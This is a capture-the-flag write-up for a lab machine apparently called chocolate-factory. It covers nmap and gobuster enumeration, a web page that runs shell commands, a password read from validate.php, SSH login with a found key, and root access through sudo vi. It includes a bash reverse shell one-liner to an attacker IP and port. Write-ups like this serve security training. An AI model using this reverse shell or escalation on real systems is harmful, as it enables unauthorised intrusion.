## Enumeration:
### Nmap Scan:
The first step of my enumeration was a scan withÂ **nmap**. by the command:

```
nmap -sC -sV -n -Pn 10.10.48.21 --reason
```

|Port   |Service   |
|---|---|
|21/tcp   |FTP   |
|22/tcp   |SSH   |
|80/tcp   |HTTP   |
|100/tcp  |newacct?  |
|106/tcp  |pop3pw?  |
|109/tcp  |pop2?  |
|110/tcp  |pop3?  |
|111/tcp  |rpcbind?  |
|113/tcp  |ident?  |
|119/tcp  |nntp?  |
|125/tcp  |locus-map?  |

### Gobuster Scan:
I next decided to run a gobuster scan on the webserver to see if there were any interesting hidden directories, by the command:

```
gobuster dir -u http://10.10.48.21/  -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x html,xml,php 
```

The wordlist I choosed to run this scan can be found in [danielmiessler's repository](https://github.com/danielmiessler/SecLists).

After we've completed our scan, we see a new page : ***"home.php"*** that allow you to submit commands via a prompt, I used the ls command and then the cat command to find the key in a file called **key\_rev\_key**.

## Enter the key you found!

```
VkgXhFf6sAE*******************************
```

## Reverse Shell

```
bash -c 'exec bash -i &>/dev/tcp/10.8.174.180/4444 <&1'
```

## What is Charlie's password?

I was looking with (www-html) user permission 
I found the password of charlie in the ***validate.php*** file:

```
cn****
```

## Enter the user flag
and I also found an rsa key and i saved it in ***Desktop/rsa***

```
ssh charlie@10.10.48.21 -i rsa
```

```
cat /home/charlie/user.txt
```

## Privilege Escalation

I typed the famous:

```
sudo -l
```

and it returned:

```
User charlie may run the following commands on chocolate-factory:
    (ALL : !root) NOPASSWD: /usr/bin/vi

```

So i run the command sa root and i typed 

```
:shell
```

And i tried to find the root flag by :

```
find / root.txt
```

and i found: /root/root.py and I typed the key that i found in the first question:

```
flag{cec5916*************************}
```
